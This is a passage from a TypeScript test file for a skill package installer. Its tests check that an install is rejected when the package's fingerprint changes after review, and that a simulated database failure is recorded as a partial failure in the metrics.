    const { PackageInstaller } = await loadInstaller()
    const recordInstall = vi.fn()
    const installer = new PackageInstaller({ metrics: { recordImportReject: vi.fn(), recordInstall } })
    const inspected = await installer.inspect({ kind: 'zip', zipPath })
    writeStoredZip(zipPath, [{ name: 'article/SKILL.md', content: '# Changed after review\n' }])

    await expect(installer.install({ kind: 'zip', zipPath }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })).rejects.toThrow(/fingerprint changed/i)

    expect(recordInstall).toHaveBeenCalledTimes(1)
    expect(recordInstall).toHaveBeenCalledWith(expect.objectContaining({ outcome: 'error' }))
  })

  it('records unknown rejects for partial installation failures', async () => {
    writeFile('first/SKILL.md', '# First\n')
    writeFile('second/SKILL.md', '# Second\n')
    const { PackageInstaller, skillPackageRepo } = await loadInstaller()
    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
    const transaction = vi.spyOn(skillPackageRepo, 'createPackageVersionInstallationTransaction')
      .mockImplementationOnce(() => { throw new Error('simulated database transaction failure') })
    const installer = new PackageInstaller({ metrics })

    const inspected = await installer.inspect({ kind: 'local-directory', directory: fixtureDir })
    const result = await installer.install({ kind: 'local-directory', directory: fixtureDir }, {
      reviewId: inspected.reviewId,
      sourceFingerprint: inspected.sourceFingerprint,
      confirm: true,
    })

    expect(result.status).toBe('partial_failure')
    expect(result.partialFailures).toHaveLength(1)
    expect(metrics.snapshot().counters.importRejects).toMatchObject({ unknown: 1 })
    expect(transaction).toHaveBeenCalled()
    transaction.mockRestore()
  })

})
